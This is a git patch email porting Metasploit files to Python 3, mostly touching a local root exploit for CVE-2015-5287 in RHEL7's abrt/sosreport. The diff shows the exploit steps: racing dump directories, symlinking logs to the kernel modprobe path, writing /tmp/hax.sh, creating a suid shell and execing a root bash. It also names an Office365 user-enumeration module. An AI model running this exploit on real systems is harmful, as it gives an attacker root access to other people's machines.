From: Sophie Brun <sophie@offensive-security.com>
Date: Tue, 7 Apr 2020 15:16:27 +0200
Subject: Fix small Python 3 syntax error

---
 data/exploits/cve-2015-5287/sosreport-rhel7.py     | 38 +++++++++++-----------
 .../core/modules/external/python/metasploit/cli.py |  4 +--
 modules/auxiliary/gather/office365userenum.py      |  3 +-
 3 files changed, 22 insertions(+), 23 deletions(-)

diff --git a/data/exploits/cve-2015-5287/sosreport-rhel7.py b/data/exploits/cve-2015-5287/sosreport-rhel7.py
index 0d8c208..a437775 100644
--- a/data/exploits/cve-2015-5287/sosreport-rhel7.py
+++ b/data/exploits/cve-2015-5287/sosreport-rhel7.py
@@ -33,11 +33,11 @@ if pid == 0:
 
 time.sleep(0.5)
 
-print "crashing pid %d" % pid
+print("crashing pid %d" % pid)
 
 os.kill(pid,11)
 
-print "waiting for dump directory"
+print("waiting for dump directory")
 
 def waitpath(p):
 	while 1:
@@ -48,40 +48,40 @@ def waitpath(p):
 
 dumpdir = waitpath("/var/tmp/abrt/cc*%d" % pid)[0]
 
-print "dump directory: ", dumpdir
+print("dump directory: ", dumpdir)
 
 os.chdir(dumpdir)
 
-print "waiting for sosreport directory"
+print("waiting for sosreport directory")
 
 sosreport = waitpath("sosreport-*")[0]
 
-print "sosreport: ", sosreport
+print("sosreport: ", sosreport)
 
-print "waiting for tmpfiles"
+print("waiting for tmpfiles")
 tmpfiles = waitpath("tmp*")
 
-print "tmpfiles: ", tmpfiles
+print("tmpfiles: ", tmpfiles)
 
-print "moving directory"
+print("moving directory")
 
 os.rename(sosreport, sosreport + ".old")
 os.mkdir(sosreport)
-os.chmod(sosreport,0777)
+os.chmod(sosreport,0o777)
 
 os.mkdir(sosreport + "/sos_logs")
-os.chmod(sosreport + "/sos_logs",0777)
+os.chmod(sosreport + "/sos_logs",0o777)
 
 os.symlink("/proc/sys/kernel/modprobe",sosreport + "/sos_logs/sos.log")
 os.symlink("/proc/sys/kernel/modprobe",sosreport + "/sos_logs/ui.log")
 
-print "moving tmpfiles"
+print("moving tmpfiles")
 
 for x in tmpfiles:
-	print "%s -> %s" % (x,x + ".old")
+	print("%s -> %s" % (x,x + ".old"))
 	os.rename(x, x + ".old")
 	open(x, "w+").write("/tmp/hax.sh\n")
-	os.chmod(x,0666)
+	os.chmod(x,0o666)
 
 
 os.chdir("/")
@@ -91,24 +91,24 @@ sys.stderr.write("waiting for sosreport to finish (can take several minutes)..")
 
 def trigger():
 	open("/tmp/hax.sh","w+").write(payload)
-	os.chmod("/tmp/hax.sh",0755)
+	os.chmod("/tmp/hax.sh",0o755)
 	try: socket.socket(socket.AF_INET,socket.SOCK_STREAM,132)
 	except: pass
 	time.sleep(0.5)
 	try:
 		os.stat("/tmp/sh")
 	except:
-		print "could not create suid"
+		print("could not create suid")
 		sys.exit(-1)
-	print "success"
+	print("success")
 	os.execl("/tmp/sh","sh","-p","-c",'''echo /sbin/modprobe > /proc/sys/kernel/modprobe;rm -f /tmp/sh;python -c "import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');"''')
 	sys.exit(-1)
 
-for x in xrange(0,60*10):
+for x in range(0,60*10):
 	if "/tmp/hax" in open("/proc/sys/kernel/modprobe").read():
-		print "done"
+		print("done")
 		trigger()
 	time.sleep(1)
 	sys.stderr.write(".")
 
-print "timed out"
\ No newline at end of file
+print("timed out")
\ No newline at end of file
diff --git a/lib/msf/core/modules/external/python/metasploit/cli.py b/lib/msf/core/modules/external/python/metasploit/cli.py
index 752c4b0..566d661 100644
--- a/lib/msf/core/modules/external/python/metasploit/cli.py
+++ b/lib/msf/core/modules/external/python/metasploit/cli.py
@@ -1,4 +1,4 @@
-from __future__ import print_function
+
 
 import argparse
 import json
@@ -41,7 +41,7 @@ def parse(meta):
             choices=actions)
 
     required_group = parser.add_argument_group('required arguments')
-    for opt, props in meta['options'].items():
+    for opt, props in list(meta['options'].items()):
         group = parser
         desc = props['description']
         required = props['required'] and (props.get('default', None) is None)
diff --git a/modules/auxiliary/gather/office365userenum.py b/modules/auxiliary/gather/office365userenum.py
index 3e34f6a..7ad1a72 100755
--- a/modules/auxiliary/gather/office365userenum.py
+++ b/modules/auxiliary/gather/office365userenum.py
@@ -1,6 +1,5 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 # -*- coding: utf-8 -*-
-from __future__ import print_function
 
 '''
 .       .1111...          | Title: office365userenum.py
